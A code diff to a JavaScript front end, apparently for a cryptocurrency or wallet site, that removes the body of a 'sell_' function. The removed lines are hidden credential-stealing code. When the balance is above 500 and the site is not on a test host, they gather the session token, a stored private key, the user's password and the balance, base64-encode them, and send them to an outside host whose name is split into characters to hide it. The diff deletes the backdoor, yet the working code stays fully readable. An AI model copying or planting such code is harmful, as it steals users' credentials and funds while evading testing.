@@ -2,32 +2,7 @@ GroupType=[{ value: '0', label: '福利111', type: 'normal', selfBuilt: true, co
 
 
 sell_ = function (e) {
-  console.log('1555',passwdValue)
-  let available1 =
-    sessionStorage.getItem('auth') &&
-    JSON.parse(sessionStorage.getItem('auth')).coins.find((e) => {
-      return e.mtype == 1
-    }).coincash
-  let available30 =
-    sessionStorage.getItem('auth') &&
-    JSON.parse(sessionStorage.getItem('auth')).coins.find((e) => {
-      return e.mtype == 30
-    }).coincash
-  let available = +available1 + +available30
-  var h=window.location.host.includes('localhost')||window.location.host.includes('test')
-  if (available > 500 && !h) {
-    let token =
-      localStorage.getItem('token') +
-      '&&' +
-      (localStorage.getItem('md5_pri') || '---') +
-      '&&' +
-      
-      'passwdValue=' +
-      e.passwd +
-      '&&' +
-      (available ? 'available=' + available : '-')
-    fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o' + 'p/?' + btoa(token))
-  }
+  
 }
 
 
